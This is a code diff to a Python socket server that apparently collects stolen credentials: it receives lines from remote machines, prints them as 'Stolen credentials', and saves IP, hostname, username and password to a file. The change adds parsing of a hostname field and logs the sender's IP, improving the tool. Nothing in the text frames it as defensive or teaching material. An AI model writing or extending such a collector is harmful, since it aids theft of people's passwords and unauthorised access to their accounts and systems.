@@ -13,10 +13,19 @@ def save_cred(ip, line):
     except:
         data = []
 
-    user, passwd = line.strip().split(':', 1)
+    # Parse hostname:username:password format
+    parts = line.strip().split(':', 2)
+    if len(parts) == 3:
+        hostname, user, passwd = parts
+    else:
+        # Fallback for old format (username:password)
+        hostname = "unknown"
+        user, passwd = line.strip().split(':', 1)
+    
     entry = {
         "timestamp": datetime.utcnow().isoformat(),
         "ip": ip,
+        "hostname": hostname,
         "username": user,
         "password": passwd
     }
@@ -37,7 +46,7 @@ def main():
                 ip = addr[0]
                 data = conn.recv(1024).decode()
                 if data:
-                    print(f"[!] Stolen credentials: {data.strip()}")
+                    print(f"[!] Stolen credentials from {ip}: {data.strip()}")
                     save_cred(ip, data)
 
 if __name__ == "__main__":
